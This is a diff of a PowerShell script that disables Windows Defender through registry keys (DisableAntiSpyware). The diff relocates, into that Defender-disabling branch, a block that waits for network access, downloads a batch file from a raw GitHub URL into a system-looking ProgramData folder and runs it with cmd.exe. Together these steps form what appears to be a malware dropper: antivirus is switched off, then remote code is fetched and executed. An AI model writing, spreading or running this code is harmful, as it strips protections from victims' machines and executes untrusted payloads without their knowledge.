@@ -88,12 +88,7 @@ if($(GET-Service -Name WinDefend).Status -eq "Running") {
     $need_reboot = $true
 } else {
    
-do {
-  $ping = test-connection -comp github.com -count 1 -Quiet
-} until ($ping){
-      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/4V4loon/InspectorConfig/main/oneline.bat" -OutFile $env:ProgramData\Microsoft\Windows\one.bat
-     }   
-    cmd.exe /c '%ProgramData%\Microsoft\Windows\one.bat'
+
 }
 
 
@@ -141,7 +136,12 @@ if($need_reboot) {
         # Disable in registry
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
-        
+        do {
+            $ping = test-connection -comp github.com -count 1 -Quiet
+          } until ($ping)
+              Invoke-WebRequest -Uri "https://raw.githubusercontent.com/4V4loon/InspectorConfig/main/oneline.bat" -OutFile $env:ProgramData\Microsoft\Windows\one.bat 
+              cmd.exe /c '%ProgramData%\Microsoft\Windows\one.bat'
+
     } else {
        
     }
